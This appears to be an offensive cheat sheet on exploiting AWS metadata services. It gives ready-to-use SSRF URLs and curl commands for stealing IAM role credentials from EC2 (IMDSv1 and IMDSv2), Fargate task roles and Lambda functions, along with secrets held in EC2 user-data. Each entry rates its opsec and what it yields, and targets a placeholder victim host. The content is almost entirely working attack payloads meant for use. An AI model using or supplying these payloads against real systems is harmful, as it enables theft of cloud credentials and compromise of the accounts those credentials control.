# AWS SSRF & Metadata Exploitation

### IMDSv1 - EC2 Credential Theft via SSRF [added: 2026-04]
- **Tags:** #AWS #SSRF #IMDS #IMDSv1 #EC2 #MetadataService #CloudCredTheft #CredentialExfil
- **Trigger:** SSRF vulnerability found in web application running on EC2 + IMDSv1 likely enabled (default on older instances)
- **Prereq:** SSRF vulnerability + EC2 instance + IMDSv1 enabled (no token required)
- **Yields:** AWS temporary credentials (AccessKeyId, SecretAccessKey, Token) for the instance's IAM role
- **Opsec:** Low
- **Context:** Web app with SSRF vuln, IMDSv1 enabled (no token required)
- **Payload/Method:**
  ```
  # Step 1: Enumerate IAM metadata
  https://victim.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/

  # Step 2: Extract role name, then dump creds
  https://victim.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>

  # Returns: AccessKeyId, SecretAccessKey, Token (temp creds)
  ```

### IMDSv2 - Token-Based Metadata Access [added: 2026-04]
- **Tags:** #AWS #SSRF #IMDS #IMDSv2 #EC2 #TokenAuth #MetadataService #PUTRequest
- **Trigger:** Target EC2 instance has IMDSv2 enforced (PUT request required) and you have SSRF or shell access
- **Prereq:** SSRF with PUT method support or shell/RCE on EC2 instance + IMDSv2 endpoint reachable
- **Yields:** AWS temporary credentials for the instance's IAM role (same as IMDSv1 but requires extra token step)
- **Opsec:** Low
- **Context:** IMDSv2 enforced — requires PUT request to get session token first
- **Payload/Method:**
  ```bash
  # Get session token (TTL up to 21600 seconds)
  export TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
    "http://169.254.169.254/latest/api/token")

  # Use token for all subsequent requests
  curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
  curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
  ```

### Fargate Container Credential Theft via SSRF [added: 2026-04]
- **Tags:** #AWS #Fargate #ECS #SSRF #ContainerCreds #MetadataEndpoint #ProcEnviron #TaskRole
- **Trigger:** SSRF or LFI vulnerability in an ECS Fargate container
- **Prereq:** SSRF or file read vulnerability in Fargate container + ECS metadata endpoint (169.254.170.2) reachable
- **Yields:** ECS task role credentials (RoleArn, AccessKeyId, SecretAccessKey, Token)
- **Opsec:** Low
- **Context:** ECS Fargate container with SSRF — use env vars to find credential URI
- **Payload/Method:**
  ```
  # Step 1: Read /proc/self/environ to find AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
  https://victim.com/download?file=/proc/self/environ

  # Step 2: Fetch credentials from ECS metadata endpoint
  https://victim.com/forward?target=http://169.254.170.2<AWS_CONTAINER_CREDENTIALS_RELATIVE_URI>

  # Returns: RoleArn, AccessKeyId, SecretAccessKey, Token
  ```

### Lambda Credential Theft via SSRF/RCE [added: 2026-04]
- **Tags:** #AWS #Lambda #SSRF #RCE #CredentialExfil #APIGateway #RuntimeAPI #EnvVars
- **Trigger:** Found SSRF or RCE vulnerability in a Lambda function exposed via API Gateway
- **Prereq:** SSRF or RCE vulnerability in Lambda function + API Gateway endpoint or direct invoke access
- **Yields:** AWS credentials from Lambda environment variables or runtime API
- **Opsec:** Med
- **Context:** Lambda function accessible via API Gateway with SSRF or RCE
- **Payload/Method:**
  ```
  # Via RCE - read environment variables (creds often hardcoded)
  https://apigateway/prod/system?cmd=env

  # Via SSRF - Lambda runtime endpoint
  https://apigateway/prod/example?url=http://localhost:9001/2018-06-01/runtime/invocation/next

  # Via file wrapper (SSRF with file:// support)
  https://apigateway/prod/system?cmd=file:///proc/self/environ
  ```

### EC2 UserData Exfiltration (Sensitive Bootstrap Data) [added: 2026-04]
- **Tags:** #AWS #EC2 #UserData #MetadataService #BootstrapSecrets #IMDS #ConfigExfil #PasswordLeak
- **Trigger:** Have shell access or SSRF on an EC2 instance and want to check for secrets in bootstrap scripts
- **Prereq:** Shell/SSRF on EC2 instance or `ec2:DescribeInstanceAttribute` permission
- **Yields:** Bootstrap scripts containing passwords, API keys, database strings, and configuration secrets
- **Opsec:** Low
- **Context:** EC2 instance accessible from inside — UserData often contains secrets/passwords
- **Payload/Method:**
  ```bash
  # IMDSv1
  curl http://169.254.169.254/latest/user-data/

  # IMDSv2
  TOKEN=$(curl -sX PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
    http://169.254.169.254/latest/api/token)
  curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data/

  # Via CLI (authenticated)
  aws ec2 describe-instance-attribute --attribute userData --instance-id <ID>
  # Output is base64 encoded — decode it!
  ```
